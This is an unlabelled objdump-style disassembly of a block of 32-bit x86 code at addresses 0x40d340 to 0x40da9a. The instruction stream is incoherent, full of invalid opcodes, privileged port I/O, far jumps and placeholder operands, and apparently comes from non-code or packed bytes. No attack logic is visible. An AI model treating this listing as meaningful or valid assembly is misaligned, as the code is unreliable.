  40d340:	xor    ch,bl
  40d342:	(bad)  
  40d343:	out    dx,al
  40d344:	sti    
  40d345:	mov    esp,0xeed9a264
  40d34a:	call   0x3134:0x3acf43b6
  40d351:	mov    eax,ds:0x6773ea
  40d356:	clc    
  40d357:	add    DWORD PTR [ecx-0x4471b30f],ebx
  40d35d:	push   ebx
  40d35e:	sbb    bh,BYTE PTR [eax-0xb]
  40d361:	loope  0x40d382
  40d363:	or     bl,BYTE PTR [edi+0x51]
  40d366:	popa   
  40d367:	inc    ebp
  40d368:	sti    
  40d369:	jns    0x40d361
  40d36b:	nop
  40d36c:	mov    dh,0xc6
  40d36e:	fwait
  40d36f:	scas   al,BYTE PTR es:[edi]
  40d370:	test   eax,0x179f1d8b
  40d375:	sbb    al,0x99
  40d377:	stos   BYTE PTR es:[edi],al
  40d378:	add    al,0xa1
  40d37a:	cmp    esi,eax
  40d37c:	into   
  40d37d:	dec    edx
  40d37e:	repz jg 0x40d323
  40d381:	sar    DWORD PTR [edx-0x55c6dc9],0x5c
  40d388:	les    eax,FWORD PTR [edi-0x79]
  40d38b:	das    
  40d38c:	fs jmp 0xc3ad:0x9fe9f3f1
  40d394:	in     al,dx
  40d395:	push   ecx
  40d396:	outs   dx,BYTE PTR ds:[esi]
  40d397:	and    ecx,edi
  40d399:	add    ebp,DWORD PTR [ebx]
  40d39b:	int    0x0
  40d39d:	cmp    ecx,esi
  40d39f:	ins    BYTE PTR es:[edi],dx
  40d3a0:	jl     0x40d34c
  40d3a2:	dec    DWORD PTR [ecx]
  40d3a4:	addr16 push edi
  40d3a6:	aas    
  40d3a7:	jbe    0x40d385
  40d3a9:	pop    esi
  40d3aa:	sub    ecx,DWORD PTR [ebp+0x8]
  40d3ad:	lods   eax,DWORD PTR ds:[esi]
  40d3ae:	out    0xf2,eax
  40d3b0:	inc    esi
  40d3b1:	shr    DWORD PTR [ecx+0x22bc5bba],cl
  40d3b7:	outs   dx,DWORD PTR ds:[esi]
  40d3b8:	fstp   st(1)
  40d3ba:	xor    ebp,ebx
  40d3bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3bd:	inc    BYTE PTR [esi+0x4b]
  40d3c0:	mov    al,BYTE PTR [esi]
  40d3c2:	retf   
  40d3c3:	es xor al,0x59
  40d3c6:	xor    al,0x6f
  40d3c8:	and    eax,0x8dffb680
  40d3cd:	mov    edi,0xc563d9c4
  40d3d2:	add    BYTE PTR [esi-0x14],0x8d
  40d3d6:	neg    BYTE PTR [ecx-0x15ebe875]
  40d3dc:	loope  0x40d3ca
  40d3de:	rcl    ecx,0xc9
  40d3e1:	fbstp  TBYTE PTR [eax+ecx*4]
  40d3e4:	clc    
  40d3e5:	loope  0x40d36c
  40d3e7:	imul   edx,DWORD PTR [ebx+0x1],0xffffffd6
  40d3eb:	mov    ebx,0xc6e3eff8
  40d3f0:	xchg   esi,eax
  40d3f1:	(bad)
  40d3f4:	mov    ds,ebx
  40d3f6:	sti    
  40d3f7:	mov    dh,0x15
  40d3f9:	les    esp,FWORD PTR [esi]
  40d3fb:	dec    DWORD PTR [ebx-0xae1fd0b]
  40d401:	lods   eax,DWORD PTR ds:[esi]
  40d402:	add    ecx,eax
  40d404:	out    dx,al
  40d405:	pop    ebx
  40d406:	sub    al,0xaf
  40d408:	fwait
  40d409:	push   ecx
  40d40a:	pop    esi
  40d40b:	je     0x40d3f9
  40d40d:	sub    edi,DWORD PTR [ebx-0x34a9f110]
  40d413:	dec    esp
  40d414:	cmp    BYTE PTR [ebx-0x447758ac],ah
  40d41a:	cmp    al,0x1f
  40d41c:	pop    ecx
  40d41d:	jae    0x40d478
  40d41f:	jnp    0x40d3f2
  40d421:	sub    DWORD PTR [eax-0x16],ebp
  40d424:	aaa    
  40d425:	dec    eax
  40d426:	cmc    
  40d427:	in     al,0x49
  40d429:	pop    DWORD PTR cs:[ebp-0x72cea488]
  40d430:	fisubr DWORD PTR [ecx+0x37f292e8]
  40d436:	hlt    
  40d437:	inc    ecx
  40d438:	or     DWORD PTR [ebx],edi
  40d43a:	ss push 0x25
  40d43d:	cmp    eax,0xda4bb0d1
  40d442:	adc    DWORD PTR [ecx+0x53],eax
  40d445:	ins    DWORD PTR es:[edi],dx
  40d446:	mov    dl,0x4d
  40d448:	mov    BYTE PTR [edi+0x1b9c772],dl
  40d44e:	arpl   WORD PTR [ebp+edx*8-0x3d],sp
  40d452:	fs pop ebp
  40d454:	sti    
  40d455:	lahf   
  40d456:	push   cs
  40d457:	mov    dh,0x6f
  40d459:	or     eax,0x15b3d6da
  40d45e:	pusha  
  40d45f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d460:	jae    0x40d4dd
  40d462:	add    BYTE PTR [ecx+ebx*1],dl
  40d465:	cwde   
  40d466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d467:	cdq    
  40d468:	in     al,0x9d
  40d46a:	daa    
  40d46b:	sbb    BYTE PTR [ecx+ecx*8-0x6f],bh
  40d46f:	sub    eax,0xeadb8a3b
  40d474:	mov    ebx,0xec665975
  40d479:	int    0x4d
  40d47b:	mov    edi,0x3bdaf195
  40d480:	cmp    DWORD PTR [eax-0x27e24375],eax
  40d486:	push   eax
  40d487:	or     esi,ecx
  40d489:	sub    edx,edx
  40d48b:	dec    ecx
  40d48c:	or     ch,dh
  40d48e:	mov    esp,0x6472d3f4
  40d493:	js     0x40d4e8
  40d495:	pop    esi
  40d496:	push   edi
  40d497:	xchg   esi,eax
  40d498:	into   
  40d499:	sub    eax,0x8d6c8a6d
  40d49e:	cwde   
  40d49f:	mov    esi,DWORD PTR [edi+0x5f]
  40d4a2:	sar    DWORD PTR [edi],1
  40d4a4:	(bad)  
  40d4a5:	in     eax,0x2d
  40d4a7:	add    DWORD PTR [edi+0x5d],ecx
  40d4aa:	xor    DWORD PTR [ebp+0x1a],edx
  40d4ad:	jg     0x40d466
  40d4af:	push   ds
  40d4b0:	gs aas 
  40d4b2:	test   al,0xd8
  40d4b4:	push   ss
  40d4b5:	add    al,0x67
  40d4b7:	sub    DWORD PTR [ebx],ebp
  40d4b9:	fs xchg esi,eax
  40d4bb:	fld    QWORD PTR [ecx+0xf]
  40d4be:	xor    esp,eax
  40d4c0:	loop   0x40d4db
  40d4c2:	mov    al,ch
  40d4c4:	mov    esi,0x86a37b31
  40d4c9:	nop
  40d4ca:	inc    ecx
  40d4cb:	mov    ds:0xe261058e,eax
  40d4d0:	mov    edx,0xe05e2e4
  40d4d5:	enter  0xc61f,0xb6
  40d4d9:	mov    eax,0x62412282
  40d4de:	jge    0x40d559
  40d4e0:	adc    BYTE PTR [eax-0x32932caa],0x47
  40d4e7:	clc    
  40d4e8:	dec    esi
  40d4e9:	sbb    eax,0x7156b595
  40d4ee:	test   BYTE PTR [bx+0x32],dl
  40d4f2:	add    DWORD PTR [ebx-0x5d825a61],edi
  40d4f8:	(bad)  
  40d4f9:	inc    ebp
  40d4fa:	adc    edi,ecx
  40d4fc:	sbb    DWORD PTR [edx-0x53],ebx
  40d4ff:	imul   ebp,DWORD PTR [ebp-0x609d8220],0x129c626a
  40d509:	mov    dl,BYTE PTR [edi-0x51158e7c]
  40d50f:	sub    esi,ebx
  40d511:	loope  0x40d4f5
  40d513:	xor    al,0x27
  40d515:	ja     0x40d532
  40d517:	pop    eax
  40d518:	lods   eax,DWORD PTR ds:[esi]
  40d519:	pop    ebp
  40d51a:	xchg   DWORD PTR [edx+0x6525970a],ecx
  40d520:	retf   
  40d521:	mov    al,ds:0x21531c27
  40d526:	add    cl,bh
  40d528:	data16 sub al,BYTE PTR [edx+0x11a6aa7a]
  40d52f:	shl    DWORD PTR [ebx+0x64118bf6],0xa6
  40d536:	adc    eax,0xf246939a
  40d53b:	ja     0x40d50c
  40d53d:	pushf  
  40d53e:	push   ecx
  40d53f:	dec    eax
  40d540:	and    BYTE PTR [edi+0x11],dl
  40d543:	mov    al,0x96
  40d545:	inc    ebp
  40d546:	pop    edx
  40d547:	jnp    0x40d4eb
  40d549:	lea    eax,[ebx]
  40d54b:	pop    edx
  40d54c:	dec    DWORD PTR [esi+ebp*4]
  40d54f:	inc    esp
  40d550:	xor    al,0x56
  40d552:	pop    es
  40d553:	and    al,0xbc
  40d555:	call   0xe9f1:0x6731ae6e
  40d55c:	fadd   st(3),st
  40d55e:	pop    ebx
  40d55f:	xchg   esi,eax
  40d560:	jle    0x40d55b
  40d562:	mov    WORD PTR [ebx],?
  40d564:	cmp    ebp,eax
  40d566:	and    eax,0xd44f32ea
  40d56b:	jecxz  0x40d5db
  40d56d:	call   0xe34c:0xa844e79b
  40d574:	dec    ebp
  40d575:	jb     0x40d5e0
  40d577:	or     dh,BYTE PTR [eax]
  40d579:	loopne 0x40d52a
  40d57b:	fcom   DWORD PTR [eax+0x23]
  40d57e:	xor    DWORD PTR [edi+0x62374eef],ecx
  40d584:	pop    esi
  40d585:	cmp    ebx,ebx
  40d587:	lods   eax,DWORD PTR ds:[esi]
  40d588:	pop    edx
  40d589:	xor    ebx,DWORD PTR [ecx+0x3e]
  40d58c:	ins    DWORD PTR es:[edi],dx
  40d58d:	out    dx,al
  40d58e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d58f:	cmc    
  40d590:	retf   
  40d591:	into   
  40d592:	(bad)  
  40d593:	or     al,0xf2
  40d595:	sbb    BYTE PTR [edi+0x20],dl
  40d598:	loop   0x40d569
  40d59a:	mov    esp,DWORD PTR [ecx+ebx*1]
  40d59d:	mov    edx,DWORD PTR cs:[edx+0x49]
  40d5a1:	dec    ecx
  40d5a2:	stc    
  40d5a3:	push   eax
  40d5a4:	fisub  WORD PTR [ebx]
  40d5a6:	imul   ebp,edi,0x3
  40d5a9:	aas    
  40d5aa:	mov    esp,DWORD PTR [esi]
  40d5ac:	test   al,0x2f
  40d5af:	xor    al,0x37
  40d5b1:	arpl   cx,dx
  40d5b3:	sbb    eax,0xdc70b8db
  40d5b8:	mov    cl,0xc7
  40d5ba:	mov    ebp,gs
  40d5bc:	mov    ds,WORD PTR [edi]
  40d5be:	inc    edi
  40d5bf:	mov    cs,WORD PTR [ecx+0x40]
  40d5c2:	push   ds
  40d5c3:	jmp    0x48c9:0xf00a226d
  40d5ca:	ret    
  40d5cb:	mov    ecx,0xa208f549
  40d5d0:	xor    esp,DWORD PTR [esi-0x7fb65bd1]
  40d5d6:	xor    DWORD PTR [edx+edi*4-0x611d1b44],ebx
  40d5dd:	mov    ds:0x61a93992,al
  40d5e2:	cmc    
  40d5e3:	retf   0xf0e4
  40d5e6:	push   0xe8dd9dcc
  40d5eb:	jmp    0x40d5bd
  40d5ed:	retf   0x885b
  40d5f0:	sti    
  40d5f1:	stos   DWORD PTR es:[edi],eax
  40d5f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5f3:	jmp    0xa46700
  40d5f8:	adc    esp,DWORD PTR [eax-0xd67f0a]
  40d5fe:	dec    ecx
  40d5ff:	jg     0x40d5eb
  40d601:	lods   eax,DWORD PTR ds:[esi]
  40d602:	retf   0xbbe5
  40d605:	jle    0x40d640
  40d607:	repz ret 0x616
  40d60b:	dec    edi
  40d60c:	fs mov al,0xf8
  40d60f:	aaa    
  40d610:	imul   ebx
  40d612:	add    bl,dl
  40d614:	enter  0xb8b3,0x43
  40d618:	cmp    esi,DWORD PTR [edx]
  40d61a:	imul   eax,DWORD PTR [eax-0x4],0xe
  40d61e:	pop    ss
  40d61f:	fst    DWORD PTR [eax+0x6d]
  40d622:	mov    edx,DWORD PTR ds:0x49d43874
  40d628:	push   ecx
  40d629:	xor    eax,0x70173d0a
  40d62e:	mov    al,0xbc
  40d630:	inc    esi
  40d631:	ud1    edi,ebx
  40d634:	int3   
  40d635:	pop    es
  40d636:	and    BYTE PTR [edx+ecx*2],dl
  40d639:	xchg   edx,eax
  40d63a:	mov    al,0x4e
  40d63c:	test   DWORD PTR [edi],esi
  40d63e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d640:	or     esp,DWORD PTR [ebx-0x74eb38e]
  40d646:	xor    bh,al
  40d648:	and    eax,0x3503b5cd
  40d64d:	psubb  mm7,QWORD PTR [ebx]
  40d650:	in     al,dx
  40d651:	ins    BYTE PTR es:[edi],dx
  40d652:	xchg   edx,eax
  40d653:	repnz pop ds
  40d655:	sbb    DWORD PTR [eax+0x6910fbbf],esi
  40d65b:	test   DWORD PTR [ecx+0x74],eax
  40d65e:	clc    
  40d65f:	enter  0xb1fd,0x7
  40d663:	pusha  
  40d664:	xor    eax,0xb43ee33b
  40d669:	shr    DWORD PTR [edx-0x6c],cl
  40d66c:	jo     0x40d6cb
  40d66e:	out    0x1,eax
  40d670:	sub    al,0x18
  40d672:	push   ds
  40d673:	inc    ecx
  40d674:	or     eax,0x5a2e2776
  40d679:	or     al,BYTE PTR [eax+0x2496e8a8]
  40d67f:	or     eax,0x6c0b0aa7
  40d684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d685:	fwait
  40d686:	mov    ah,0x8d
  40d688:	xchg   edi,eax
  40d689:	or     al,0x5
  40d68b:	and    DWORD PTR [ebx+0x480bdf77],ebx
  40d691:	call   0x3c05:0xcf0d7040
  40d698:	xchg   ebx,eax
  40d699:	retf   0x93fb
  40d69c:	out    0x60,al
  40d69e:	call   0x3648:0xb805d113
  40d6a5:	in     al,dx
  40d6a6:	clc    
  40d6a7:	inc    ecx
  40d6a8:	stc    
  40d6a9:	sbb    al,0x7f
  40d6ab:	pop    esp
  40d6ac:	adc    edx,DWORD PTR [edi+0x6d]
  40d6af:	and    al,0x18
  40d6b1:	inc    esp
  40d6b2:	ss jg  0x40d6be
  40d6b5:	mov    ?,WORD PTR [esi]
  40d6b7:	fiadd  WORD PTR [esi-0x6d]
  40d6ba:	mov    bh,0xf3
  40d6bc:	mov    cl,ch
  40d6be:	shl    BYTE PTR [edx+0x56],0x2a
  40d6c2:	daa    
  40d6c3:	or     DWORD PTR [edi-0x65],edi
  40d6c6:	stos   DWORD PTR es:[edi],eax
  40d6c7:	sub    ecx,esi
  40d6c9:	gs pop ecx
  40d6cb:	mov    WORD PTR [ecx-0x7f],gs
  40d6ce:	daa    
  40d6cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6d0:	fimul  WORD PTR [ebx+0x41da7600]
  40d6d6:	shl    BYTE PTR [edx-0x49],cl
  40d6d9:	into   
  40d6da:	inc    esi
  40d6db:	inc    ecx
  40d6dc:	retf   0xf5a5
  40d6df:	retf   0x445d
  40d6e2:	pop    eax
  40d6e3:	aaa    
  40d6e4:	xchg   BYTE PTR [ecx+esi*8-0x1],ah
  40d6e8:	push   cs
  40d6e9:	(bad)  
  40d6eb:	(bad)  
  40d6ec:	jge    0x40d71d
  40d6ee:	push   ds
  40d6ef:	pop    ds
  40d6f0:	imul   esp,DWORD PTR [esi+0x36],0x3f
  40d6f4:	jb     0x40d755
  40d6f6:	pop    ebp
  40d6f7:	mov    BYTE PTR [ebx+0x13],0xab
  40d6fb:	shl    esp,cl
  40d6fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6fe:	jae    0x40d6e6
  40d700:	(bad)  
  40d701:	and    ebp,DWORD PTR [edi]
  40d703:	dec    ebp
  40d704:	in     eax,dx
  40d705:	pop    es
  40d706:	xlat   BYTE PTR ds:[ebx]
  40d707:	daa    
  40d708:	out    dx,eax
  40d709:	and    esi,DWORD PTR [edx+0x76e792ae]
  40d70f:	xchg   ecx,eax
  40d710:	fmul   QWORD PTR [ebp-0x23]
  40d713:	or     DWORD PTR [edi-0x13],eax
  40d716:	push   edi
  40d717:	push   edx
  40d718:	push   0xffffffe3
  40d71a:	(bad)  
  40d71c:	and    ch,BYTE PTR [ebx+0x62]
  40d71f:	(bad)  [edi+0x57823047]
  40d725:	pushf  
  40d726:	mov    ecx,0x9ba76a10
  40d72b:	sbb    BYTE PTR [esi+ebp*1+0x2d],0xcd
  40d730:	push   esp
  40d731:	mov    ds,WORD PTR [ecx+0x22]
  40d734:	cld    
  40d735:	jge    0x40d6c4
  40d737:	(bad)  
  40d738:	movsx  edx,WORD PTR [ebx+edi*1]
  40d73c:	jp     0x40d732
  40d73e:	xlat   BYTE PTR ds:[ebx]
  40d73f:	aam    0x32
  40d741:	std    
  40d742:	xchg   esp,eax
  40d743:	pop    esi
  40d744:	fidiv  DWORD PTR [ebx-0x68]
  40d747:	dec    eax
  40d748:	test   DWORD PTR [ecx+0x2cff109c],0xe8e620aa
  40d752:	inc    ecx
  40d753:	mov    DWORD PTR [ebp+0x4c],eax
  40d756:	adc    eax,0x1ec2b15
  40d75b:	repnz int 0x46
  40d75e:	loope  0x40d6f7
  40d760:	and    bh,al
  40d762:	push   0xdcbf03d7
  40d767:	add    eax,0xb41bb0fd
  40d76c:	cmp    eax,0x6f4766a7
  40d771:	xor    edx,DWORD PTR [ecx]
  40d773:	stos   BYTE PTR es:[edi],al
  40d774:	outs   dx,BYTE PTR ds:[esi]
  40d775:	call   0x64df:0x67b31832
  40d77c:	sti    
  40d77d:	inc    ebp
  40d77e:	xor    al,0x80
  40d780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d781:	dec    ecx
  40d782:	xchg   esp,eax
  40d783:	xchg   ebx,eax
  40d784:	stos   DWORD PTR es:[edi],eax
  40d785:	mov    eax,0x6edb1bc6
  40d78a:	scas   al,BYTE PTR es:[edi]
  40d78b:	es icebp 
  40d78d:	pusha  
  40d78e:	outs   dx,BYTE PTR ds:[esi]
  40d78f:	ret    
  40d790:	xor    DWORD PTR [edi+0x76a182c7],0x7e6c9d12
  40d79a:	push   ss
  40d79b:	call   0x72cab35b
  40d7a0:	pusha  
  40d7a1:	push   esp
  40d7a2:	and    al,0x22
  40d7a4:	cwde   
  40d7a5:	cmp    dl,ah
  40d7a7:	jle    0x40d779
  40d7a9:	mov    ch,0x69
  40d7ab:	ss loop 0x40d7bc
  40d7ae:	sar    BYTE PTR [edi+0x11],cl
  40d7b1:	das    
  40d7b2:	dec    ebp
  40d7b3:	cmp    DWORD PTR [ebx],esi
  40d7b5:	adc    bh,BYTE PTR [ecx]
  40d7b7:	dec    eax
  40d7b8:	loop   0x40d770
  40d7ba:	cmp    eax,0x4f102582
  40d7bf:	pop    ebx
  40d7c0:	xchg   esp,eax
  40d7c1:	fwait
  40d7c2:	mov    ds:0xdf7d46f3,al
  40d7c7:	xchg   ebp,eax
  40d7c8:	pop    edx
  40d7c9:	add    dl,ah
  40d7cb:	mov    ch,0x5
  40d7cd:	mov    edx,0x574dea74
  40d7d2:	lahf   
  40d7d3:	dec    esp
  40d7d4:	mov    ebx,0x5e67719
  40d7d9:	loopne 0x40d83c
  40d7db:	or     edi,DWORD PTR ds:0x57f377f
  40d7e1:	in     eax,dx
  40d7e2:	stos   BYTE PTR es:[edi],al
  40d7e3:	loope  0x40d7dc
  40d7e5:	jl     0x40d7a8
  40d7e7:	fild   QWORD PTR [edi+0x6d]
  40d7ea:	pop    edi
  40d7eb:	sbb    ebp,DWORD PTR [esi-0x1426d22]
  40d7f1:	neg    BYTE PTR [edx]
  40d7f3:	loop   0x40d865
  40d7f5:	mov    ds:0x98e108a4,eax
  40d7fa:	(bad)  
  40d7fb:	pop    ebp
  40d7fc:	fdivr  QWORD PTR [ebp+0x1e5d7ae2]
  40d802:	push   ebx
  40d803:	mov    edx,0x56cda54e
  40d808:	je     0x40d84e
  40d80a:	out    0x71,eax
  40d80c:	frstor [ebp+0x31]
  40d80f:	mov    DWORD PTR [edi],0x280b17dd
  40d815:	push   ecx
  40d816:	sbb    eax,0xdd28eeb3
  40d81b:	jnp    0x40d7e5
  40d81d:	pop    esp
  40d81e:	jmp    0xd0680c83
  40d823:	sbb    eax,DWORD PTR [edi]
  40d825:	into   
  40d826:	mov    bl,0x63
  40d828:	out    0x80,al
  40d82a:	push   edx
  40d82b:	adc    DWORD PTR [edi-0x8f26255],ecx
  40d831:	int3   
  40d832:	add    eax,esi
  40d834:	shl    BYTE PTR [ecx+edi*1],0x71
  40d838:	push   0xb11fb58
  40d83d:	inc    ecx
  40d83e:	xchg   ecx,eax
  40d83f:	inc    ecx
  40d840:	jecxz  0x40d82b
  40d842:	xchg   ebx,eax
  40d843:	pop    ss
  40d844:	push   esi
  40d845:	lock xchg edi,eax
  40d847:	pop    ss
  40d848:	rcr    DWORD PTR [esi-0x3ff9f163],0xb7
  40d84f:	cmp    esp,DWORD PTR [edx]
  40d851:	cmc    
  40d852:	xchg   edx,eax
  40d853:	hlt    
  40d854:	xchg   edi,eax
  40d855:	mov    es,WORD PTR [ebx+0x399e26f8]
  40d85b:	and    DWORD PTR [edi+0x353095e0],ebx
  40d861:	mov    esi,DWORD PTR [ecx-0x5ccb07c]
  40d867:	fstp   QWORD PTR [edi-0x1a40e37c]
  40d86d:	stc    
  40d86e:	addr16 sub sp,di
  40d872:	cmc    
  40d873:	gs out 0xff,al
  40d876:	xor    eax,0x82273de0
  40d87b:	adc    DWORD PTR [eax+0x51401ba7],esi
  40d881:	stos   BYTE PTR es:[edi],al
  40d882:	and    BYTE PTR [edx],ah
  40d884:	stos   DWORD PTR es:[edi],eax
  40d885:	icebp  
  40d886:	adc    edi,DWORD PTR [ecx+0x21]
  40d889:	addr16 sbb al,0x54
  40d88c:	mov    edi,0x3cd8522e
  40d891:	test   dl,0xad
  40d894:	icebp  
  40d895:	inc    edx
  40d896:	js     0x40d87f
  40d898:	fmul   DWORD PTR [edi]
  40d89a:	dec    esp
  40d89b:	or     BYTE PTR ds:0x6d6351c2,ah
  40d8a1:	in     al,dx
  40d8a2:	pop    es
  40d8a3:	cmp    eax,DWORD PTR [eax+0x5123b237]
  40d8a9:	pushf  
  40d8aa:	inc    edi
  40d8ab:	leave  
  40d8ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8ad:	pusha  
  40d8ae:	imul   DWORD PTR [edi]
  40d8b0:	jno    0x40d897
  40d8b2:	push   0x27eb0833
  40d8b7:	test   DWORD PTR [ebp-0x182c219],esi
  40d8bd:	pop    ds
  40d8be:	and    BYTE PTR [ecx-0x21],0xc1
  40d8c2:	dec    edx
  40d8c3:	xor    esi,edx
  40d8c5:	sbb    dl,cl
  40d8c7:	retf   
  40d8c8:	jg     0x40d90f
  40d8ca:	fist   WORD PTR [ebx+0x427c96ec]
  40d8d0:	fdivr  st,st(3)
  40d8d2:	adc    ecx,ebx
  40d8d4:	shl    BYTE PTR [ebp+0x2ea17928],1
  40d8da:	pop    ss
  40d8db:	pop    edx
  40d8dc:	xor    edx,eax
  40d8de:	inc    edi
  40d8df:	mov    BYTE PTR [edx-0x4859e7a],bh
  40d8e5:	push   ebx
  40d8e6:	pushf  
  40d8e7:	mov    ecx,0x7ac7564c
  40d8ec:	aam    0xaa
  40d8ee:	call   DWORD PTR [ebp-0x4b6408bc]
  40d8f5:	adc    esi,DWORD PTR [edi-0x74d55574]
  40d8fb:	pop    edi
  40d8fc:	nop
  40d8fd:	inc    ebp
  40d8fe:	ret    
  40d8ff:	test   DWORD PTR [esp+eax*1],esi
  40d902:	cld    
  40d903:	lea    ebp,[ebp+0x4a]
  40d906:	push   ebx
  40d907:	(bad)  
  40d909:	xchg   ecx,eax
  40d90a:	imul   ebx,eax,0x37daa4a5
  40d910:	pop    esi
  40d911:	sbb    al,0x58
  40d913:	mov    ch,0x54
  40d915:	xchg   ebp,eax
  40d916:	inc    edx
  40d917:	loope  0x40d8d6
  40d919:	jbe    0x40d90a
  40d91b:	shl    BYTE PTR [ecx+eiz*2],1
  40d91e:	lods   eax,DWORD PTR ds:[esi]
  40d91f:	jnp    0x40d8e1
  40d921:	or     DWORD PTR [edi],esi
  40d923:	fs cmc 
  40d925:	jb     0x40d8cf
  40d927:	stos   DWORD PTR es:[edi],eax
  40d928:	and    al,0x5c
  40d92a:	sub    DWORD PTR [ebx-0x67],edx
  40d92d:	inc    ebx
  40d92e:	(bad)  
  40d92f:	jno    0x40d956
  40d931:	mov    dh,0x3d
  40d933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d934:	fnsave [eax]
  40d936:	out    dx,eax
  40d937:	std    
  40d938:	or     eax,0xbf5b055c
  40d93d:	das    
  40d93e:	add    BYTE PTR [edi-0x6952c60f],bh
  40d944:	and    ebp,eax
  40d946:	jno    0x40d93f
  40d948:	pusha  
  40d949:	and    BYTE PTR [ecx-0x54],ah
  40d94c:	out    dx,eax
  40d94d:	aaa    
  40d94e:	cld    
  40d94f:	inc    BYTE PTR [edi]
  40d951:	jae    0x40d927
  40d953:	int    0x87
  40d955:	(bad)  
  40d956:	in     eax,dx
  40d957:	sahf   
  40d958:	cld    
  40d959:	or     al,0xb2
  40d95b:	cmp    al,0xae
  40d95d:	or     ch,dl
  40d95f:	inc    eax
  40d960:	pusha  
  40d961:	xchg   BYTE PTR [esi],al
  40d963:	sub    DWORD PTR [esi-0x3],ebx
  40d966:	adc    DWORD PTR [ebp-0x1d],ebp
  40d969:	sbb    BYTE PTR [edx+ebp*2+0xf3908e5],bh
  40d970:	shr    DWORD PTR es:[esi+0x70bb461b],0x97
  40d978:	sbb    ebp,ecx
  40d97a:	inc    edx
  40d97b:	xchg   edx,eax
  40d97c:	cli    
  40d97d:	ja     0x40d9cb
  40d97f:	outs   dx,BYTE PTR ds:[esi]
  40d980:	pop    ebx
  40d981:	push   0x73898c2
  40d986:	lock mov esi,0xd5c9ee87
  40d98c:	mov    ch,0xda
  40d98e:	je     0x40d9bf
  40d990:	dec    edi
  40d991:	fiadd  WORD PTR [ebx+0x17393bcd]
  40d997:	jle    0x40d998
  40d999:	cmp    al,0xe0
  40d99b:	arpl   sp,bp
  40d99d:	push   edi
  40d99e:	adc    cl,BYTE PTR [esp+ebp*1]
  40d9a1:	cwde   
  40d9a2:	xor    esi,DWORD PTR [ebp+0x66700fac]
  40d9a8:	xor    esp,DWORD PTR [edi-0x50]
  40d9ab:	mov    esi,0xdd574e34
  40d9b0:	outs   dx,BYTE PTR cs:[esi]
  40d9b2:	mov    WORD PTR [ecx],cs
  40d9b4:	add    edi,DWORD PTR [ebx]
  40d9b6:	stc    
  40d9b7:	push   0x44a20bfb
  40d9bc:	aas    
  40d9bd:	aaa    
  40d9be:	or     al,0x5c
  40d9c0:	call   0x988b751a
  40d9c5:	xor    dh,ch
  40d9c7:	xor    BYTE PTR [edi],ah
  40d9c9:	les    ecx,FWORD PTR [esi+0x1c]
  40d9cc:	sbb    ch,BYTE PTR ds:0x94d3f485
  40d9d2:	aaa    
  40d9d3:	push   ebx
  40d9d4:	jl     0x40d9d5
  40d9d6:	scas   eax,DWORD PTR es:[edi]
  40d9d7:	out    dx,eax
  40d9d8:	ins    DWORD PTR es:[edi],dx
  40d9d9:	popf   
  40d9da:	ret    0x274b
  40d9dd:	dec    eax
  40d9de:	jne    0x40da2e
  40d9e0:	mov    ch,0x41
  40d9e3:	mov    al,ds:0xa5b0bff2
  40d9e8:	jmp    0xe10f:0xe185b751
  40d9ef:	cs dec ebx
  40d9f1:	std    
  40d9f2:	addr16 push ds
  40d9f4:	loope  0x40d9f6
  40d9f6:	inc    esp
  40d9f7:	int    0xd5
  40d9f9:	inc    edi
  40d9fa:	push   0xe2016436
  40d9ff:	adc    al,BYTE PTR [edx]
  40da01:	mov    eax,ds:0x4c6d7932
  40da06:	sar    BYTE PTR [edi+0x526c7729],1
  40da0c:	xor    DWORD PTR [edi+eax*8+0x6b],0xffffffd0
  40da11:	enter  0x8493,0xcb
  40da15:	or     eax,DWORD PTR [ecx+0x1cf645a8]
  40da1b:	mov    eax,0x988e759d
  40da20:	jp     0x40da8f
  40da22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da23:	(bad)  
  40da24:	pop    eax
  40da25:	(bad)  
  40da26:	mov    edx,0x41bf551b
  40da2b:	mov    bh,0x57
  40da2d:	mov    ebp,0x594c1cb5
  40da32:	xchg   ecx,eax
  40da33:	xchg   ebp,eax
  40da34:	dec    eax
  40da35:	jno    0x40da20
  40da37:	pop    esi
  40da38:	rcr    bh,cl
  40da3a:	std    
  40da3b:	or     edi,DWORD PTR [ebp-0x19]
  40da3e:	adc    DWORD PTR [esi+0x64],ecx
  40da41:	stos   DWORD PTR es:[edi],eax
  40da42:	pop    ebp
  40da43:	and    al,0x59
  40da45:	pusha  
  40da46:	out    dx,eax
  40da47:	js     0x40da68
  40da49:	add    esi,0xfc7cfdcb
  40da4f:	xlat   BYTE PTR ds:[ebx]
  40da50:	iret   
  40da51:	mov    ah,BYTE PTR [ebx]
  40da53:	pushf  
  40da54:	fmul   QWORD PTR fs:[ebx]
  40da57:	xchg   ebp,eax
  40da58:	aam    0x29
  40da5a:	sub    edx,DWORD PTR [ebx+0x3177030e]
  40da60:	pop    ds
  40da61:	adc    eax,0x14dace81
  40da66:	xchg   edi,eax
  40da67:	add    eax,DWORD PTR [eax+0x2b7688eb]
  40da6d:	fimul  WORD PTR [esp+ecx*8-0x3a]
  40da71:	enter  0x2b0a,0x96
  40da75:	inc    ebx
  40da76:	sbb    BYTE PTR [ebp+ebx*8+0x7e38d812],0xeb
  40da7e:	xchg   ebp,eax
  40da7f:	push   ebp
  40da80:	mov    ah,0x5a
  40da82:	leave  
  40da83:	nop
  40da84:	jo     0x40da53
  40da86:	lods   eax,DWORD PTR ds:[esi]
  40da87:	sbb    ch,BYTE PTR [esi+ebp*1+0x2dd78814]
  40da8e:	mov    eax,0x95455432
  40da93:	cdq    
  40da94:	lds    ebp,FWORD PTR [ecx]
  40da96:	or     al,0x13
  40da98:	in     al,dx
  40da99:	pop    ds
  40da9a:	xchg   DWORD PTR [edx],ecx
